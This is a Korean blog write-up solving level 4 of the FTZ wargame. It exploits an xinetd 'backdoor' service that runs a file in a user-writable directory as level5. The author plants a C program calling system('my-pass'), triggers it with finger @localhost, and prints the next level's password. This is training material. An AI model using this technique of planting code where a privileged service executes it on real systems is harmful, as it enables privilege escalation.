{"pageProps":{"post":{"slug":"2017-09-08-FTZ-level-4","content":"\nid = level4 pw = level4\n\n![](/assets/posts/ftz/level4.png)\n\nlevel4 의 hint를 보면 누군가 `/etc/xinetd.d/에 백도어를 심어놓았다!` 라고 뜬다.\n디렉토리 이동을 하고 파일 목록을 보면 backdoor가 보인다.\n\n![](/assets/posts/ftz/xinetd.png)\n\nbackdoor 파일은 read 할 수 있고, 열어보면 아래와 같이 뜬다.\n\n```c\n[level4@ftz xinetd.d]$ cat backdoor\nservice finger\n{\n\tdisable\t= no\n\tflags\t\t= REUSE\n\tsocket_type\t= stream\n\twait\t\t= no\n\tuser\t\t= level5\n\tserver\t\t= /home/level4/tmp/backdoor\n\tlog_on_failure\t+= USERID\n\n}\n```\n\n다른 파일들을 열었을때는 이런식으로 service (읽은 파일명) { ... } 인데\n\n```c\n[level4@ftz xinetd.d]$ cat services\n# default: off\n# description: An internal xinetd service, listing active services.\nservice services\n{\n\tdisable\t= yes\n\ttype\t\t= INTERNAL UNLISTED\n\tport\t\t= 9098\n\tsocket_type\t= stream\n\tprotocol\t= tcp\n\twait\t\t= no\n\tonly_from\t= 127.0.0.1\n}\n```\n\nbackdoor는 `service finger` 가 뜬다.\n\n그럼 finger를 보자.\n\n```c\n[level4@ftz xinetd.d]$ cat finger\n# default: on\n# description: The finger server answers finger requests. Finger is \\\n#\ta protocol that allows remote users to see information such \\\n#\tas login name and last login time for local users.\nservice finger\n{\n\tdisable\t= yes\n\tsocket_type\t= stream\n\twait\t\t= no\n\tuser\t\t= nobody\n\tserver\t\t= /usr/sbin/in.fingerd\n}\n```\n\n우선, backdoor의 server 부분  /home/level4/tmp/ 로 이동하면 아무 파일도 없다.\n그럼 이 디렉토리에 level5의 패스워드를 알려주도록 코드를 짜서 backdoor 로 만들면 어떨까\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n\nint main(void) {\n        system(\"my-pass\");\n        return 0;\n}\n```\n\n그냥 backdoor를 실행시켜 버리면 level4의 pw가 뜨므로 소용이 없다.\nfinger를 이용해야 하는데, finger 명령어는 리눅스에서 사용자의 계정정보를 확인하는 명령어이다.\n$finger @host명을 입력하면 해당서버에 접속해 있는 모든 유저의 정보를 출력한다.\n그래서 $ finger @localhost 를 입력해 finger 서비스를 실행시키면 된다.\n\n![](/assets/posts/ftz/level4_clear.png)\n\n`Level5 Password is \"what is your name?\".`\n","layout":"post","title":"[FTZ] level 4","categories":["FTZ"],"excerpt":" ","comments":true,"share":true,"tags":["FTZ"]}},"__N_SSG":true}